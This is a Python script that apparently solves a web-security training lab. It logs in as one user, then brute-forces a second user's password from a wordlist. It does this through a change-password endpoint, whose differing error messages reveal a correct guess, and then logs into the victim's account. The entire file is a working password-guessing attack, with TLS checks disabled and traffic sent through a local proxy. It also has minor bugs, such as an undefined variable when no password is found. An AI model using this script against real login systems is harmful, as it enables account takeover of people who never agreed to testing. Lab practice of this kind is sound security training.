import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def access_carlos_account(s,url):
    print("✅ Logging into Wiener's account...")
    login_url = url + '/login'
    login_data = {"username":"wiener","password":"peter"}
    r = s.post(login_url,data=login_data,verify=False,proxies=proxies)

    print("✅ Brute-forcing Carlos's password...")
    with open('..\\Auth Wordlists\\password-wordlist.txt','r') as file:
        lines = file.readlines()

    for pwd in lines:
        pwd = pwd.strip('\n')
        print("Trying password: " + pwd)

        requestUrl = url + '/my-account/change-password'
        requestData = {"username":"carlos","current-password":pwd,"new-password-1":"1","new-password-2":"2"}
        req = s.post(url=requestUrl,data=requestData,proxies=proxies,verify=False)

        if "New passwords do not match" in req.text:
            print("✅ Found Carlos's password: " + pwd)
            carlos_pwd = pwd
            break

    if carlos_pwd:
        #login to carlos's account
        login_data = url + '/login'
        login_data = {"username":"carlos","password":carlos_pwd}
        r = s.post(login_url,data=login_data,verify=False,proxies=proxies)
        
        if "Log out" in r.text:
            print("✅ Successfully logged into Carlos's account.")
        else:
            print("❌ Could not log into Carlos's account")
            sys.exit(1)
    else:
        print("❌ Coud not find Carlos's password.")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print("⚠️  Usage url %s" % sys.argv[0])
        print("⚠️  Example %s www.example.com" % sys.argv[0])
        sys.exit(1)
    url = sys.argv[1]
    s = requests.Session()
    access_carlos_account(s,url)

if __name__ == "__main__":
    main()
